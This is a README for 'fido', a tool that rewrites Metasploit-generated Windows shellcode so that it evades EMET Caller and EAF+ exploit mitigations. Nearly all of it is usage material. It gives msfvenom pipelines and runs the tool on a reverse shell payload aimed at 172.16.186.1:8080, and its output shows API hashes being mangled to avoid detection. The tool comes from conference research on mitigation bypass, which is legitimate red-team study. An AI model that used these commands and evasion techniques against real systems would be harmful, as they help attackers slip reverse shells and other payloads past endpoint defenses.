# fido
Teaching an old shellcode new tricks

Give fido.py a x86 (32 bit or 64 bit) windows shellcode and it will strip off Stephen Fewer's hash API stub and replace it 
with something that bypasses EMET Caller and EAF+ checks but keeps the actual API calls in use.

# WARNING: If the 2nd stage payload uses the hash api from metasploit that loads Win APIs from the Export Address Table and jmp's into them, EMET will catch it.

If the warning didn't make sense, you might want to walk away or read up: 

* REcon BR Slides: https://github.com/secretsquirrel/fido/blob/master/REconBR_2017.pdf
* Defcon 25 Slides: https://github.com/secretsquirrel/fido/blob/master/Defcon_25_2017.pdf
* Demo1 (Hash Mangling POC): https://youtu.be/p3vFRx5dur0
* Demo2 (Tor Exploit POC): https://youtu.be/oqHT6Ienudg

## Usage

Can take input from stdout and output to stdout:
```
msfvenom -p windows/exec CMD=calc EXITFUNC=thread | ~/github/fido/testharness.py -m -b Tcpview.exe -p ExternGPA -t win10  > test.bin
```

Can take input from cmdline (via -s).

Want win7-win10 compatibility?  Use the following command:

```
msfvenom -p windows/exec CMD=calc EXITFUNC=thread | ~/github/fido/fido.py -p ExternGPA -l api-ms-win-core-libraryloader-l1-1-0.dll -d kernel32.dll > test.bin
```

This will use GetProcAddress in api-ms-win-core-libraryloader-l1-1-0.dll import from the kernel32.dll loaded module. 


Help output:

```
[!] -s is required either from cmd line flag or stdin <cat code.bin> | ./fido.py
usage: use "fido.py --help" for more information

This code imports metasploit sourced x86 windows shellcode that employs
Stephen Fewers Hash API stub and replaces it to bypass EMET Caller/EAF checks
and other bolt on mitigations. Accepts msfvenom output from stdin or from disk.
Doesn't do logic checks on provided payload to ensure it is x86 (32bit) or for windows
OS (up to you to be correct)

positional arguments:
  infile
  outfile

optional arguments:
  -h, --help            show this help message and exit
  -b TARGETBINARY, --targetbinary TARGETBINARY
                        Binary that shellcode will be customized to (Optional)
  -t OS, --OSTarget OS  OS target for looking for target DLL Import Tables: winXP, win7, win8, winVista, win10
  -s CODE, --shellcode CODE
                        x86/x64 Windows Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin
  -d DLL, --DLLName DLL
                        If you know the DLL in the IAT you are targeting enter this, no need for OS flag.
  -l IMPORTNAME, --Import IMPORTNAME
                        For use with -d and ExternGPA (-p), specify either 'kernel32.dll' or
                        'api-ms-win-core-libraryloader' -- you need to know with import you are targeting.
                        To know, run without -d for a list of candidates. Default is kernel32.dll but not always right!

  -m, --mangle          Mangle metasploit hash apis from their original values (you want to do this)
  -o OUTPUT, --output OUTPUT
                        How you would like your output: [c], [p]ython, c[s]harp Default: stdout.
  -p PARSER_STUB, --parser_stub PARSER_STUB
                        By default this assumes that GetProcAddress (GPA) is in the targetbinary's
                        Import Address Table (IAT) if no targetbinary or DLL name is provided.
                        Four options:
                            GPA  - GPA is in targetbinary IAT (default)
                            LLAGPA - LoadlibraryA(LLA)/GPA is in the targetbinary IAT (smallest shellcode option)
                            ExternGPA -- need DLLName or targetbinary to use
                            ExternLLAGPA -- need DLLName or targetbinary to use
                            ExternGPAFC -- -d kernel32.dll -l kernelbase.dll  # only works on win8 - win10
                            OffsetGPA -- -b target.EXE # static offset to that version of software (target EXE)
                            ExternOffsetGPA -- -b target.DLL -d import_dll # static
  -n, --donotfail       Default: Fail if Stephen Fewers Hash API stub is not there, use -n to bypass
  -M MODE, --mode MODE ASM mode 32 or 64, usually automatic
```

## Other Examples:

 ### ExternGPAFC
Works on Win8-Win10 only.
```
 cat ~/github/metasploit-framework/reverse_shell_x64_8080_172.16.186.1.bin |  ./fido.py -b ~/github/the-backdoor-factory/whois64.exe -m -p ExternGPAFC -t win10 > test.bin
[*] Length of submitted payload: 0x1cc
[*] Stripping Stripping Fewers 64bit hash stub 
[*] Length of code after stripping: 258
[*] Disassembling payload
[*] Mangling kernel32.dll!LoadLibraryA call hash: 0x5df8d241
[*] Mangling ws2_32.dll!WSAStartup call hash: 0xe6fe222e
[*] Mangling ws2_32.dll!WSASocketA call hash: 0x16f19f04
[*] Mangling ws2_32.dll!connect call hash: 0x76223a2d
[*] Mangling kernel32.dll!CreateProcessA call hash: 0x6d6e1502
[*] Mangling kernel32.dll!WaitForSingleObject call hash: 0x44e7a13f
[*] Mangling kernel32.dll!ExitThread call hash: 0x5a4eb474
[*] Mangling kernel32.dll!GetVersion call hash: 0xf1669f77
[*] Mangling ntdll.dll!RtlExitUserThread call hash: 0x66b4939a
[*] Called APIs: ['kernel32.dll!LoadLibraryA', 'ws2_32.dll!WSAStartup', 'ws2_32.dll!WSASocketA', 'ws2_32.dll!connect', 'kernel32.dll!CreateProcessA', 'kernel32.dll!WaitForSingleObject', 'kernel32.dll!ExitThread', 'kernel32.dll!GetVersion', 'ntdll.dll!RtlExitUserThread']
[*] String Table: b'ExitThread\x00WSASocketA\x00CreateProcessA\x00kernel32\x00LoadLibraryA\x00RtlExitUserThread\x00ws2_32\x00connect\x00GetVersion\x00WaitForSingleObject\x00ntdll\x00WSAStartup\x00'
[*] Building lookup table
[*] Using ExternGPAFC from  hash: 0x0, import name: kernelbase.dll
[*] Assembling lookup table stub
[*] Payload complete
[*] Output size: 964

```


 ### ExternOffset
Uses the exact location of GetProcAddress Offset for a particular dll and import dll. In this case, kernel32_10.0.16237_32bit.dll is the target version bianry, and GPA exists in kernel32.dll via (minwin).

```
cat ~/github/metasploit-framework/reverse_shell_x64_8080_172.16.186.1.bin |  ./fido.py -b kernel32_10.0.16237_32bit.dll -d kernel32.dll -m -p ExternOffsetGPA -t win10 > test.bin                          
[*] Length of submitted payload: 0x1cc
[*] Stripping Stripping Fewers 64bit hash stub 
[*] Length of code after stripping: 258
[*] Disassembling payload
[*] Mangling kernel32.dll!LoadLibraryA call hash: 0x89d3d69b
[*] Mangling ws2_32.dll!WSAStartup call hash: 0x23b6665d
[*] Mangling ws2_32.dll!WSASocketA call hash: 0x7c77f885
[*] Mangling ws2_32.dll!connect call hash: 0x78e785f1
[*] Mangling kernel32.dll!CreateProcessA call hash: 0x53e02b59
[*] Mangling kernel32.dll!WaitForSingleObject call hash: 0xcb5b4068
[*] Mangling kernel32.dll!ExitThread call hash: 0xcd188037
[*] Mangling kernel32.dll!GetVersion call hash: 0x6a298791
[*] Mangling ntdll.dll!RtlExitUserThread call hash: 0x1b59416e
[*] Called APIs: ['kernel32.dll!LoadLibraryA', 'ws2_32.dll!WSAStartup', 'ws2_32.dll!WSASocketA', 'ws2_32.dll!connect', 'kernel32.dll!CreateProcessA', 'kernel32.dll!WaitForSingleObject', 'kernel32.dll!ExitThread', 'kernel32.dll!GetVersion', 'ntdll.dll!RtlExitUserThread']
[*] String Table: b'RtlExitUserThread\x00WSAStartup\x00CreateProcessA\x00WaitForSingleObject\x00WSASocketA\x00LoadLibraryA\x00ws2_32\x00GetVersion\x00ExitThread\x00ntdll\x00connect\x00kernel32\x00'
[*] Building lookup table
[*] Loading PE in pefile
[*] Parsing data directories
[*] Found API: loadlibrarya
[*] Found API: getprocaddress
[*] Both LLA/GPA APIs found!
[*] Using ExternOffsetGPA from kernel32.dll hash: 0x6a4abc5b, import name: main_module
[*] Parsing data directories...
[*] GPA offset: 0x710a8
[*] Assembling lookup table stub
[*] Payload complete
[*] Output size: 830
```


